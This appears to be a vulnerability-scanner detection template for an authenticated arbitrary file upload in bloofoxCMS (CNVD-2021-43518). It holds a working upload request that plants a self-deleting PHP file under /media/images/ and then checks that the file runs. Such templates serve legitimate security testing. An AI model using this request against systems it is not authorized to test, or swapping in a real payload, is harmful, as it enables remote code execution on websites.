name: poc-yaml-bloofoxcms-cnvd-2021-43518-upload
binding: a9d9eb87-5d46-4768-9881-97f9517f58fe
detail:
    author: zzgslh
    links:
        - https://blog.csdn.net/zzgslh/article/details/112306611
    check_action: need login, set 'sid'
transport: http
set:
    rboundary: randomLowercase(29)
    r1: randomLowercase(8)
    r2: randomLowercase(8)
    sid: b"4hhpoakdq7rdtsv9gvplo5bui0"
rules:
    r0:
        request:
            method: POST
            path: ^/admin/index.php?mode=tools&page=upload
            follow_redirects: false
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------{{rboundary}}
                Cookie: sid={{sid}}
            body: |-
                -----------------------------{{rboundary}}
                Content-Disposition: form-data; name="dir"

                ../media/images/
                -----------------------------{{rboundary}}
                Content-Disposition: form-data; name="file1"; filename="{{r1}}.php"

                <?php echo "{{r2}}"; unlink(__FILE__); ?>
                -----------------------------{{rboundary}}
                Content-Disposition: form-data; name="send"

                Upload File(s)
                -----------------------------{{rboundary}}
        expression: response.status == 302
    r1:
        request:
            method: GET
            path: ^/media/images/{{r1}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(r2))
expression: r0() && r1()
